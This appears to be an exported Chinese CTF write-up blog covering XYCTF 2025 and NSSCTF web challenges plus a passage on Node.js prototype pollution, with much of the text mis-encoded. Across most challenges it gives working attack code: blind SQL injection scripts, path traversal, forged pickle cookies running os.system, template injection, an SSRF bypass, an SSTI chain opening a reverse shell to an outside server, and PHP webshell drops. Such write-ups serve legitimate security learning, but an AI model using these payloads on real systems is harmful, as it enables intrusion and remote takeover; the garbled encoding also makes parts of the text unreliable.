è¿™ä¸ªæ˜¯åˆ¤æ–­æ—¶é—´æ˜¯å¦å°äºä¸¤ç§’çš„é€»è¾‘ æŠŠå…¶æ”¹ä¸ºå¤§äº è‡ªå·±ç©ä¸€éæ‹¼å›¾å°±okäº† flagY0u__aRe_a_mAsteR_of_PUzZL!!@!!~! ezsql(æ‰‹åŠ¨æ»‘ç¨½)sqlæ¯‹åº¸ç½®ç–‘ æ³¨å…¥ç‚¹æ˜¯usrname é—­åˆæ—¶å•å¼•å· fuzzä¸€ä¸‹å‘ç°è¿‡æ»¤äº†,ç©ºæ ¼ç­‰ é¦–å…ˆç©ºæ ¼ä½¿ç”¨%09ç»•è¿‡ å› ä¸º,è¢«banäº†çš„åŸå›  å¾ˆå¤šè¯­å¥éƒ½ä¸å¯ä»¥ç”¨ ä½¿ç”¨ case whenè¯­å¥æ¥è¿›è¡Œæ—¶é—´ç›²æ³¨ è¯­å¥æ„é€ ï¼š !!!è¯·æ³¨æ„:pythoné‡Œç›²æ³¨è¦æŠŠ%09æ”¹ä¸º\\t å› ä¸ºrequeståº“ä¼šå°†\\tç¼–ç ä¸º%09 çˆ†æ•°æ®åº“ testdb 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((database())%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# çˆ†è¡¨ double_check,user 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(table_name)%09FROM%09information_schema.tables%09WHERE%09table_schema=database())%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# çˆ†åˆ—secret,username,password 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(column_name)%09FROM%09information_schema.columns%09WHERE%09table_schema=database())%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# çˆ†æ•°æ® è¿‡æ»¤äº†é€—å·ä¸€ä¸ªä¸€ä¸ª usernameyudeyoushang passwordzhonghengyisheng secretdtfrtkcc0czkoua9S 1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(username)%09FROM%09double_check)%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END#1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(password)%09FROM%09double_check)%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END#1%09or%09CASE%09WHEN%09(ASCII(SUBSTRING((SELECT%09GROUP_CONCAT(secret)%09FROM%09double_check)%09FROM%091%09FOR%091))100)%09THEN%09SLEEP(2)%09ELSE%090%09END# å¥½äº†ç°åœ¨å°±æ˜¯è¶…çº§æ—¶åˆ» æ‹¿ç€çˆ†å‡ºçš„è´¦å·å¯†ç ç™»å½• ç„¶åè¿›å…¥å‘ç°è¦è¾“å…¥å¯†é’¥ è¾“å…¥secretçˆ†å‡ºçš„ä¸œè¥¿ è¿›å…¥ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œç³»ç»Ÿ æ‰§è¡Œå‘½ä»¤å°±å¯ä»¥ è¿‡æ»¤ç©ºæ ¼ä¸”æ— å›æ˜¾å†™å…¥æ–‡ä»¶å°±å¥½äº† cat$IFS/f*1.txt sqlæ—¶é—´ç›²æ³¨æ¨¡æ¿ import requestsimport timeurl = urldef get_database(url): name = for i in range(1, 100): low = 32 high = 128 while low high: mid = (low + high) // 2 payload = f1\\tor\\tCASE\\tWHEN\\t(ASCII(SUBSTRING((SELECT\\tGROUP_CONCAT(secret)\\tFROM\\tdouble_check)\\tFROM\\ti\\tFOR\\t1))mid)\\tTHEN\\tSLEEP(2)\\tELSE\\t0\\tEND# params = username: payload, password: 1, start_time = time.time() r = requests.post(url, data=params) end_time = time.time() if end_time - start_time = 1.5: low = mid + 1 else: high = mid if low == 32: break name += chr(low) print(name)get_database(url) Signinä¸‹è½½é™„ä»¶å®¡è®¡æºç  from bottle import Bottle, request, response, redirect, static_file, run, routewith open(../../secret.txt, r) as f: secret = f.read()app = Bottle()@route(/)def index(): return HI@route(/download)def download(): name = request.query.filename if ../../ in name or name.startswith(/) or name.startswith(../) or \\\\ in name: response.status = 403 return Forbidden with open(name, rb) as f: data = f.read() return data@route(/secret)def secret_page(): try: session = request.get_cookie(name, secret=secret) if not session or session[name] == guest: session = name: guest response.set_cookie(name, session, secret=secret) return Forbidden! if session[name] == admin: return The secret has been deleted! except: return Error!run(host=0.0.0.0, port=8080, debug=False) downloadä¸‹å­˜åœ¨ç›®å½•ç©¿è¶Š ä½†æ˜¯è¿‡æ»¤äº†....æœå¯»èµ„æ–™ç”¨ä¸‹./.././../ payloadï¼š./.././../secret.txt è·å–åˆ°secret_keyï¼šHell0_H@cker_Y0u_A3r_Sm@r7 é‚£å°±è¿›è¡Œsessionä¼ªé€  å½“å‰name: !4SSvdzbD0UYv84Lnpmm1VLtPBddCrvhgQOLkNQbhjek=?gAWVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFZ3Vlc3SUc2Uu å¾ˆå¥‡æ€ªå¯¹å§ ä¸¢ç»™aié—®ä¸‹ ç›´æ¥å«ä»–å¸®ä½ å†™è„šæœ¬ import pickleimport base64import hmacimport hashlibsecret = bHell0_H@cker_Y0u_A3r_Sm@r7# 1. ä¿æŒåŸå§‹ç»“æ„ï¼Œåªæ›¿æ¢guestéƒ¨åˆ†original_structure = [name, name: admin] # å…³é”®ä¿®æ”¹ç‚¹# 2. åºåˆ—åŒ–pickled_data = pickle.dumps(original_structure)print(=== ç¼–ç å‰çš„æ¶æ„æ•°æ®ç»“æ„ ===)print(fPythonå¯¹è±¡: original_structure)print(fPickleå­—èŠ‚: pickled_data)# 3. ç”Ÿæˆcookieencoded_data = base64.b64encode(pickled_data).decode(utf-8)signature = hmac.new(secret, encoded_data.encode(), hashlib.sha256).digest()malicious_cookie = f!base64.b64encode(signature).decode()?encoded_dataprint( === æœ€ç»ˆæ¶æ„cookie ===)print(malicious_cookie)å¾—åˆ° !w7ggni+OONpuUroWJe5pEGGQSE1aUyCHrz6RoSzaQEA=?gASVGQAAAAAAAABdlCiMBG5hbWWUfZRoAYwFYWRtaW6Uc2Uu ç„¶åæäº¤ä¼šè§¦å‘ ä½†æ˜¯æ²¡ä»€ä¹ˆç”¨ pickleååºåˆ—åŒ– import pickleimport base64import hmacimport hashlibsecret = bHell0_H@cker_Y0u_A3r_Sm@r7class MaliciousPayload: def __reduce__(self): import os return (os.system, (cat /flag* /flag,)) # æ›¿æ¢ä¸ºä½ éœ€è¦çš„å‘½ä»¤# 1. ä¿æŒåŸå§‹ç»“æ„ï¼Œåªæ›¿æ¢guestéƒ¨åˆ†original_structure = [name, name: MaliciousPayload()] # å…³é”®ä¿®æ”¹ç‚¹# 2. åºåˆ—åŒ–pickled_data = pickle.dumps(original_structure)print(=== ç¼–ç å‰çš„æ¶æ„æ•°æ®ç»“æ„ ===)print(fPythonå¯¹è±¡: original_structure)print(fPickleå­—èŠ‚: pickled_data)# 3. ç”Ÿæˆcookieencoded_data = base64.b64encode(pickled_data).decode(utf-8)signature = hmac.new(secret, encoded_data.encode(), hashlib.sha256).digest()malicious_cookie = f!base64.b64encode(signature).decode()?encoded_dataprint( === æœ€ç»ˆæ¶æ„cookie ===)print(malicious_cookie) æ³¨æ„è¿™é‡Œæœ‰ä¸€ç‚¹å°å‘:linuxå’Œwinè¿è¡Œè¿™ä¸ªè„šæœ¬çš„ç»“æœæ˜¯ä¸ä¸€æ ·çš„ linuxæ˜¯ winæ˜¯ linuxçš„æ‰æ˜¯å¯¹çš„ é—®äº†é—®å…¶ä»–å¸ˆå‚… è¯´æ˜¯ winä¼šè®°å½• os.system çš„ win å®ç° nt.systemLinuxè®°å½•çš„æ˜¯ os.system çš„ Linux å®ç° posix.system è€Œè„šæœ¬é‡Œçš„hashåªè¦æœ‰ä¸€ä¸ªå­—ç¬¦å°±ä¼šä¸åŒ æ‰€ä»¥ç”Ÿæˆç»“æœä¸åŒ å…ˆ å† XYCTFWe1c0me_t0_XYCTF_2o25!The_secret_1s_L@men7XU_L0v3_u! å‡ºé¢˜äººå·²ç–¯æºç  # -*- encoding: utf-8 -*-@File : app.py@Time : 2025/03/29 15:52:17@Author : LamentXU import bottleflag in /flag@bottle.route(/)def index(): return Hello, World!@bottle.route(/attack)def attack(): payload = bottle.request.query.get(payload) if payload and len(payload) 25 and open not in payload and \\\\ not in payload: return bottle.template(hello +payload) else: bottle.abort(400, Invalid payload)if __name__ == __main__: bottle.run(host=0.0.0.0, port=5000) é™åˆ¶æ˜¯25ä¸ªå­—ç¬¦ _import__(os).system(cat /f*123) è¿™æ˜¯è¦æ€»å…±æ‰§è¡Œçš„payload ä½†æ˜¯è¶…è¿‡äº†25ä¸ªå­—ç¬¦ å¦‚ä½•ç»•è¿‡å‘¢ çœ‹äº†å‡ºé¢˜äººçš„wp æœ¬è´¨ä¸Šè¿˜æ˜¯ç»™ä¸€ä¸ªå˜é‡ä¸æ–­åœ°èµ‹å€¼ æœ€åè¾¾åˆ°ç»•è¿‡25ä¸ªå­—ç¬¦çš„æ ‡å‡† ç±»ä¼¼çš„é¢˜å¯ä»¥è§VNCTF2025 é‡Œçš„å­¦ç”Ÿç®¡ç†ç³»ç»Ÿ VNé‡Œç”¨çš„æ˜¯æµ·è±¡è¡¨è¾¾å¼(å› ä¸ºé¢˜ç›®æ˜¯å¤šè¡Œ) è€Œè¿™é“é¢˜æ˜¯å•è¡Œ æ‰€ä»¥å°±å°†payloadæŒ‰ç…§å‡ ä¸ªå­—ç¬¦ä¸€ç»„ å¼„æˆäº†åˆ—è¡¨ é€šè¿‡å¾ªç¯ä¸æ–­èµ‹å€¼ æœ€ç»ˆpayload import requestsurl = url/attackpayload = __import__(os).system(cat /f*123)p = [payload[i:i+3] for i in range(0,len(payload),3)]flag = Truefor i in p: if flag: tmp = f %import os;os.a=i flag = False else: tmp = f %import os;os.a+=i r = requests.get(url,params=payload:tmp)r = requests.get(url,params=payload: %import os;eval(os.a))r = requests.get(url,params=payload: %include(123)).text //è¿™ä¸€æ­¥æ˜¯è¯»å–æœåŠ¡å™¨ä¸‹çš„ç”Ÿæˆçš„æ–‡ä»¶123print(r) flagL@men7XU_d0es_n0t_w@nt_t0_g0_t0_scho01 Fateæºä»£ç  #!/usr/bin/env python3import flaskimport sqlite3import requestsimport stringimport jsonapp = flask.Flask(__name__)blacklist = string.ascii_lettersdef binary_to_string(binary_string): if len(binary_string) % 8 != 0: raise ValueError(Binary string length must be a multiple of 8) binary_chunks = [binary_string[i:i+8] for i in range(0, len(binary_string), 8)] string_output = .join(chr(int(chunk, 2)) for chunk in binary_chunks) return string_output@app.route(/proxy, methods=[GET])def nolettersproxy(): url = flask.request.args.get(url) if not url: return flask.abort(400, No URL provided) target_url = http://lamentxu.top + url for i in blacklist: if i in url: return flask.abort(403, I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~) if . in url: return flask.abort(403, No ssrf allowed) response = requests.get(target_url) return flask.Response(response.content, response.status_code)def db_search(code): with sqlite3.connect(database.db) as conn: cur = conn.cursor() cur.execute(fSELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(code)))))))) found = cur.fetchone() return None if found is None else found[0]@app.route(/)def index(): print(flask.request.remote_addr) return flask.render_template(index.html)@app.route(/1337, methods=[GET])def api_search(): if flask.request.remote_addr == 127.0.0.1: code = flask.request.args.get(0) if code == abcdefghi: req = flask.request.args.get(1) try: req = binary_to_string(req) print(req) req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) except: flask.abort(400, Invalid JSON) if name not in req: flask.abort(400, Empty Persons name) name = req[name] if len(name) 6: flask.abort(400, Too long) if \\ in name: flask.abort(400, NO ) if ) in name: flask.abort(400, NO )) Some waf hidden here ;) fate = db_search(name) if fate is None: flask.abort(404, No such Person) return Fate: fate else: flask.abort(400, Hello local, and hello hacker) else: flask.abort(403, Only local access allowed)if __name__ == __main__: app.run(debug=True) proxyè·¯ç”±ä¸‹è¿›è¡Œssrf ä½†æ˜¯è¿‡æ»¤äº†. å°±å°è¯•ç”¨åè¿›åˆ¶æ¥ç»•è¿‡æœ¬åœ°å›ç¯åœ°å€ å½“åŠ å…¥@ å°±åªè§£æ@åé¢çš„ç½‘å€ è¦è®¿é—®æœ¬åœ°çš„1337è·¯ç”± äºæ˜¯å†™å…¥payload/proxy?url=@2130706433:8080/1337 ç„¶å1337è·¯ç”±ä¸‹è¦æ»¡è¶³ä¼ å…¥çš„0å‚æ•°å€¼ä¸ºabcdefghi ä½†æ˜¯é»‘åå•æ˜¯è¿‡æ»¤äº†å­—æ¯ è¿™é‡Œå°±æœ‰ä¸ªå°trick urläºŒæ¬¡ç¼–ç ç»•è¿‡ æ»¡è¶³ååˆå¯ä»¥ä¼ å…¥1å‚æ•° 1 è¦è¿›è¡Œsqlæ³¨å…¥ if flask.request.remote_addr == 127.0.0.1: code = flask.request.args.get(0) if code == abcdefghi: req = flask.request.args.get(1) try: req = binary_to_string(req) print(req) req = json.loads(req) # No one can hack it, right? Pickle unserialize is not secure, but json is ;) except: flask.abort(400, Invalid JSON) if name not in req: flask.abort(400, Empty Persons name) import sqlite3conn = sqlite3.connect(database.db)conn.execute(CREATE TABLE FATETABLE ( NAME TEXT NOT NULL, FATE TEXT NOT NULL);)Fate = [ (JOHN, 1994-2030 Dead in a car accident), (JANE, 1990-2025 Lost in a fire), (SARAH, 1982-2017 Fired by a government official), (DANIEL, 1978-2013 Murdered by a police officer), (LUKE, 1974-2010 Assassinated by a military officer), (KAREN, 1970-2006 Fallen from a cliff), (BRIAN, 1966-2002 Drowned in a river), (ANNA, 1962-1998 Killed by a bomb), (JACOB, 1954-1990 Lost in a plane crash), (LAMENTXU, r2024 Send you a flag flagFAKE)]conn.executemany(INSERT INTO FATETABLE VALUES (?, ?), Fate)conn.commit()conn.close() è¯·æ³¨æ„è¦urlencodeç¼–ç  è¦ç”¨descå¯ä»¥é€†å‘æŸ¥è¯¢ /proxy?url=@2130706433:8080/1337?0=%2561%2562%2563%2564%2565%2566%2567%2568%2569%261=011110110010001001101110011000010110110101100101001000100011101001111011001000100010011100101001001010010010100100101001001010010010100100101001001000000101010101001110010010010100111101001110001000000101001101000101010011000100010101000011010101000010000001000110010000010101010001000101001000000100011001010010010011110100110100100000010001100100000101010100010001010101010001000001010000100100110001000101001000000101011101001000010001010101001001000101001000000100111001000001010011010100010100111101001001110100110001000001010011010100010101001110010101000101100001010101001001110010000000101101001011010010001000111010001100010111110101111101 flagDo4t_bElIevE_in_FatE_Y1s_Y0u_2_a_Js0n_ge1nus! æ€»ç»“è¿™æ˜¯æœ¬æ–°æ‰‹ç¬¬ä¸€æ¬¡å‚åŠ XYCTF åæ­£æˆ‘è‡ªå·±æŒºåç‰¢çš„( èµ›é¢˜webå°±å‡ºäº†ä¸‰é“ç®€å•é¢˜ ä½†æ˜¯å¯ä»¥å­¦åˆ°ä¸œè¥¿å°±å¥½ SSTIè€ƒéš¾äº†æ ¹æœ¬ä¸ä¼š(Ã— è¿˜æœ‰ä¸€äº›è‡ªå·±ä¸ç†Ÿæ‚‰çš„å°trick ä¸è¿‡æ…¢æ…¢æ¥ï¼","tags":["CTF-wp"]},{"title":"NSSCTF Round30 BasicåŒäººç»„é˜Ÿèµ›","path":"/2025/04/07/NSSCTF Round30 BasicåŒäººç»„é˜Ÿèµ›/","content":"hack_the_world!from flask import Flask, request, render_template,render_template_string, url_for, sessionimport timeimport osapp = Flask(__name__)app.secret_key = NSSFILTER_KEYWORDS = [Cialloï½(âˆ ãƒ»Ï‰ ï¼œï¼‰âŒ’â˜…]def contains_forbidden_keywords(complaint): for keyword in FILTER_KEYWORDS: if keyword.lower() in complaint: return True return False@app.route(/, methods=[GET, POST])def index(): session[user] = Gamer return render_template(index.html)@app.route(/hack, methods=[GET, POST])def hack(): if session.get(user) != hacker: return render_template(die.html,user=session.get(user)) if (abc:=request.headers.get(User-Agent)) is None: return render_template(fobidden.html) cmd = request.form.get(cmd,noting) if (answer:=request.args.get(answer)) == hack_you: if contains_forbidden_keywords(cmd): return render_template(forbidden.html) else: render_template_string(fcmd,cmd=cmd) css_url = url_for(static, filename=style.css) js_url = url_for(static, filename=script.js) return render_template_string(f !DOCTYPE html html lang=zh head meta charset=UTF-8 meta name=viewport content=width=device-width, initial-scale=1.0 titlefake world/title link rel=stylesheet href=css_url !-- No ping No curl No nc , little hacker blind no way-- /head body canvas class=matrix/canvas div class=bg-animation/div div class=container h1So, what are you trying to do/h1 pJust quit, little hacker. Thereâ€™s nothing for you here./p /div script src=js_url/script /body /html , css_url=css_url,js_url=js_url) æºç ç»è¿‡å®¡è®¡ å¯ä»¥ç¡®å®šä¸ºssti + flask.sessionä¼ªé€  flaskä¼ªé€ secret-key:NSS å¾—åˆ°session:eyJ1c2VyIjoiaGFja2VyIn0.Z_IwwQ.fYDi-wb5WZ3xq_Q2oxb3JSg7Qjw ä¿®æ”¹è®¿é—®hack SSTIæ»¡è¶³getä¼ å…¥answerhack_you postä¼ å…¥cmdå‚æ•° å³sstiæ³¨å…¥ç‚¹ è¾“å…¥49æ— ååº” å°è¯•éšä¾¿è¾“äº†å‡ ä¸ªä¹Ÿæ²¡ååº” ç”¨burp fuzzä¸€ä¸‹ æ‰¾åˆ°äº†waf é»‘åå•:[â€˜.â€™,â€™_â€™,â€™]â€™,â€™%â€™,â€™readâ€™,â€™mroâ€™] çœ‹å“åº”åŒ…ä¹Ÿæœ‰æç¤º ç»“åˆå‰é¢é™¤wafä»¥å¤–ä¸å›æ˜¾ åˆ¤æ–­ä¸ºç›²æ³¨ ä¼ å…¥payload: è¦urlç¼–ç  lipsum|attr(lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last+globals+lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last)|attr(get)(lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last+builtins+lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last)|attr(get)(lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last+import+lipsum|escape|batch(22)|list|first|last+lipsum|escape|batch(22)|list|first|last)(os)|attr(popen)([åå…­è¿›åˆ¶ç¼–ç åçš„bash -c bash -i /dev/tcp/vps/port 01])|attr(read)() ç›‘å¬è‡ªå·±ç«¯å£ vpsæˆåŠŸåå¼¹shell ä½ æ˜¯è°çš„èœé¸Ÿï¼Œåˆæ˜¯è°çš„ä½¬å¤§è¿›å»æ— ä¿¡æ¯ æŸ¥çœ‹æºç å‘ç°æç¤º $NSS = $_GET[NSS]; if (!preg_match(/([A-Z]|;| |\\$|~|\\#|\\(|\\^)/i, $NSS)) exec($NSS); else echo $Narration; æ— å­—æ¯RCE ä¸€èˆ¬çš„éƒ½ä¸èƒ½ç”¨ è¿™é‡Œä»‹ç»ä¸€ç§æ–¹æ³• å…·ä½“åŸç†è§pç¥æ–‡ç«  https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html é¦–å…ˆæœ¬åœ°èµ·ä¸€ä¸ªhtmlæ–‡ä»¶ !DOCTYPE htmlhtmlhead meta charset=utf-8 titlePOST ä¼ è¾“æ•°æ®åŒ… POC/title/headbody form action=http://node1.anna.nssctf.cn:28468/ method=post enctype=multipart/form-data label for=fileæ–‡ä»¶åï¼š/label input type=file name=file id=filebr input type=submit name=submit value=æäº¤ /form/body/html ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ 1.txt #!/binecho PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4= | base64 -d shell.php //å†™ä¸€å¥è¯æœ¨é©¬åˆ°shell.phpæ–‡ä»¶ ä¸Šä¼ åè‡ªåŠ¨è·³è½¬åˆ°ç½‘é¡µ æŠ“åŒ…å³å¯ getä¼ å…¥?NSS.%09???????????[@-[] å†è®¿é—®shell.php æˆåŠŸè®¿é—® å†™é©¬æˆåŠŸ è¿æ¥èšå‰‘ æ ¹ç›®å½•æ‰¾flagæ–‡ä»¶å³å¯ ä½ ä¹Ÿæ˜¯è¿·å®«é«˜æ‰‹å—è¿›å…¥é¶æœºå‘ç°æ˜¯ä¸ªå°æ¸¸æˆ é™æ—¶10så®Œæˆ10ä¸ªè¿·å®« è¿·å®«éšæœº å¾ˆæ˜æ˜¾çš„reqeuståº“å†™è„šæœ¬ éå¸¸è€ƒéªŒå†™è„šæœ¬*(è°ƒæ•™aiçš„èƒ½åŠ›Ã—* ç¬”è€…ä¸æƒ³å¤šå†™ è¯¦è§å®˜æ–¹wp https://www.nssctf.cn/note/set/12045 ç®€å•çš„PHPphpç±»å‹é¢˜ ç¬¬ä¸€å…³ ?phpinclude jeer.php;highlight_file(__FILE__);error_reporting(0);$A = 0;$B = 0;$C = 0;//ç¬¬ä¸€å…³if (isset($_GET[one])) $str = $_GET[str] ?? 0; $add = substr($str, 0, 1); $add++; if (strlen($add) 1 ) $A = 1; else echo $one; else echo $begin;//ç¬¬äºŒå…³if (isset($_GET[two])) $comment = $_GET[comment] ?? echo(114514); if (!preg_match(/(|;| |\\$|~|\\#|`|\\|\\|\\*|?|||\\r| |\\^)/i, $comment) strlen($comment) 20) try eval($B = 1;.$comment.;echo $two;die();); catch (Error $e) echo $boom; //ç¬¬ä¸‰å…³if (isset($_GET[three])) if (isset($_POST[one])isset($_POST[two])) $a1=(string)$_POST[one]; $a2=(string)$_POST[two]; if ($a1 !== $a2 sha1($a1) === sha1($a2)) $C = 1; else echo $three; if ($A == 1 $B == 1 $C == 1) echo file_get_contents($_POST[file]);? å‰é¢çš„ä¸èµ˜è¿° å°±è€ƒcveæ“è„šæœ¬å•¦ ä¹‹å‰ghctfçš„æ—¶å€™åˆšåˆšå¥½æŠŠæ”¹å¥½çš„æ‹¿æ¥ç”¨ é¡¹ç›®åœ°å€ï¼šhttps://github.com/ambionics/cnext-exploits è™šæ‹Ÿæœºcloneä¸‹æ¥ ç„¶åæŠŠé‡Œé¢çš„è„šæœ¬æ”¹ä¸ºä¸‹é¢è¿™ä¸ª æ‰§è¡Œå‘½ä»¤å°±å¥½ ğŸ“‚ ç‚¹å‡»å±•å¼€ cne.py % include cne.py % kaliæ‰§è¡Œå‘½ä»¤ python3 cne.py http://node7.anna.nssctf.cn:21532/ echo ?php @eval(\\$_POST[\\cmd\\]);? 22.php è®¿é—®22.php å†™å…¥æœ¨é©¬æˆåŠŸ ç»ˆç«¯è¯»å–flag å‘µå‘µå–œæ¬¢è—flag ç”¨ find / -name *flag* æ‰¾åˆ°å¯ç–‘ç›®å½• 114514flag è¯»å– æˆåŠŸå¾—åˆ°flag","tags":["CTF-wp"]},{"title":"Node.jsåŸå‹é“¾æ±¡æŸ“å­¦ä¹ ","path":"/2025/04/06/JSåŸå‹é“¾æ±¡æŸ“/","content":"åŸå‹é“¾æ±¡æŸ“å­¦ä¹ é“¾æ¥ï¼šhttps://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1 node.jsjsåˆ›å»ºå¯¹è±¡çš„å½¢å¼1.æ™®é€šåˆ›å»ºvar name=name:sauy,age:19var person= 2.æ„é€ å‡½æ•°æ–¹æ³•åˆ›å»ºfunction person() this.name=sauy; this.test=function () return 23333; person.prototype.a=3;web=new person();console.log(web.test());console.log(web.a) 3.é€šè¿‡objectåˆ›å»ºvar a=new object();a.c=3console.log(a,c) prototypeå’Œ__proto__prototypeåŸå‹å¯¹è±¡ __proto__ åŸå‹é“¾è¿æ¥ç‚¹ function Foo() this.bar=1Foo.prototype.show = function show() console.log(this.bar) let foo = new foo() foo.show() 1.ç”¨æ³•ï¼ˆæœ‰ç‚¹ç»•å¯¹è±¡.ptotoæ„é€ å™¨(æ„é€ å‡½æ•°).prototype æ„é€ å™¨.prototypeå…¶å®ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä¸ºæ„é€ å‡½æ•°çš„åŸå‹å¯¹è±¡ï¼ŒåŒæ ·æœ‰__proto__å±æ€§ï¼Œä¸€ç›´é€šè¿‡åŸå‹é“¾__proto__æœ€ç»ˆå¯æ‰¾åˆ°nullã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡Foo.prototypeæ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä½†Fooå®ä¾‹åŒ–å‡ºæ¥çš„å¯¹è±¡ï¼Œæ˜¯ä¸èƒ½é€šè¿‡prototypeè®¿é—®åŸå‹çš„ã€‚è¿™æ—¶å€™ï¼Œå°±è¯¥__proto__ç™»åœºäº†ã€‚ ä¸€ä¸ªFooç±»å®ä¾‹åŒ–å‡ºæ¥çš„fooå¯¹è±¡ï¼Œå¯ä»¥é€šè¿‡foo.__proto__å±æ€§æ¥è®¿é—®Fooç±»çš„åŸå‹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼š foo.__proto__ == Foo.prototype ç†è§£ï¼šæ¯ä¸ªç±»å¯¹è±¡å®ä¾‹åŒ–çš„æ—¶å€™éƒ½ä¼šæ‹¥æœ‰prototypeä¸­çš„å±æ€§å’Œæ–¹æ³• ä¸€ä¸ªå¯¹è±¡çš„__proto__çš„å±æ€§ï¼ŒæŒ‡å‘è¿™ä¸ªå¯¹è±¡æ‰€åœ¨ç±»çš„prototypeçš„å±æ€§ var A=function();var a=new A();é“¾å­é¡ºåºå¦‚ä¸‹å›¾ï¼š Exï¼š function Father() this.first_name = Donald this.last_name = Trump function Son() this.first_name = Melania Son.prototype = new Father() //è®©sonçš„çˆ¶ç±»ä¸ºfather å­ç±»ä¸»åŠ¨å»é€‰æ‹©äº†çˆ¶ç±» let son = new Son()console.log(`Name: $son.first_name $son.last_name`)//æœ€åsonç»§æ‰¿çš„fatherçš„last_nameçš„å±æ€§-è¾“å‡ºï¼šName:Melania Trump è°ƒç”¨son.last_nameçš„æ—¶å€™ å®é™…jså†…éƒ¨çš„æ“ä½œï¼š sonä¸­æ‰¾ä¸åˆ°last_nameï¼Œå°±åœ¨son.__ptoto__ä¸­å¯»æ‰¾last_name,è¿™é‡Œæ‰¾åˆ°äº†last_nameäºæ˜¯å°±è¾“å‡º å¦‚æœæ²¡æœ‰æ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨son.__proto__.__proto__ä¸­ç»§ç»­å¯»æ‰¾,ä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°nullç»“æŸã€‚ ä¸Šé¢æè¿°çš„jsçš„æŸ¥æ‰¾æœºåˆ¶å°±ç§°ä¸ºï¼šprototypeç»§æ‰¿é“¾ åŸå‹é“¾æ±¡æŸ“1.ä¸Šè¿°æè¿°å®è·µ // fooæ˜¯ä¸€ä¸ªç®€å•çš„JavaScriptå¯¹è±¡let foo = bar: 1 // foo.bar æ­¤æ—¶ä¸º1console.log(foo.bar) // ä¿®æ”¹fooçš„åŸå‹ï¼ˆå³Objectï¼‰foo.__proto__.bar = 2 // ç”±äºæŸ¥æ‰¾é¡ºåºçš„åŸå› ï¼Œfoo.barä»ç„¶æ˜¯1console.log(foo.bar) // æ­¤æ—¶å†ç”¨Objectåˆ›å»ºä¸€ä¸ªç©ºçš„zooå¯¹è±¡let zoo = // æŸ¥çœ‹zoo.barconsole.log(zoo.bar)æœ€åï¼Œè™½ç„¶zooæ˜¯ä¸€ä¸ªç©ºå¯¹è±¡ï¼Œä½†zoo.barçš„ç»“æœå±…ç„¶æ˜¯2ï¼š è§£é‡Šï¼šå› ä¸ºå‰é¢æˆ‘ä»¬ä¿®æ”¹äº†fooçš„åŸå‹foo.__proto__.bar = 2ï¼Œè€Œfooæ˜¯ä¸€ä¸ªObjectç±»çš„å®ä¾‹ï¼Œæ‰€ä»¥å®é™…ä¸Šæ˜¯ä¿®æ”¹äº†Objectè¿™ä¸ªç±»ï¼Œç»™è¿™ä¸ªç±»å¢åŠ äº†ä¸€ä¸ªå±æ€§barï¼Œå€¼ä¸º2ã€‚ åæ¥ï¼Œæˆ‘ä»¬åˆç”¨Objectç±»åˆ›å»ºäº†ä¸€ä¸ªzooå¯¹è±¡let zoo {}ï¼Œzooå¯¹è±¡è‡ªç„¶ä¹Ÿæœ‰ä¸€ä¸ªbarå±æ€§äº† 2.åˆ‡å…¥å£ å®ç°åŸå‹é“¾æ±¡æŸ“æ‰¾åˆ°æ§åˆ¶æ•°ç»„(å¯¹è±¡)çš„é”®åçš„æ“ä½œå°±å¯ä»¥ï¼š å¯¹è±¡å’Œå±æ€§çš„è¡¨è¾¾æ–¹å¼å¾ˆå¤šï¼Œå¦‚ä¸‹å›¾ï¼š å¯¹è±¡merge(åˆå¹¶) å¯¹è±¡clone(å…‹éš†) mergeï¼šä¸‹è¿°ä»£ç å±•ç¤ºäº†mergeçš„å…·ä½“åŠŸèƒ½ function merge(target, source) for (let key in source) if (key in source key in target) merge(target[key], source[key]) else target[key] = source[key] ç†è§£: const obj1 = a: 1, b: x: 10 ;const obj2 = b: y: 20 , c: 3 ;merge(obj1, obj2);console.log(obj1);//æœ€åä¼šè¾“å‡º a: 1,b: x: 10, y: 20 ,c: 3 aå’Œcéƒ½åªå­˜åœ¨å„è‡ªçš„ç±»é‡Œï¼Œbä¸¤ä¸ªç±»éƒ½æœ‰ï¼Œæ‰€ä»¥åˆå¹¶åœ¨ä¸€èµ·ã€‚ let o1 = let o2 = a:1,__proto__:b:2merge(o1,o2)console.log(o1.a,o1.b)o3 = console.log(o3.b) ä¸Šè¿°ä»£ç æˆåŠŸåˆå¹¶ 3.æ”»å‡»æ–¹å¼ function Father() this.first_name = Donald this.last_name = Trump function Son() this.first_name = Melania 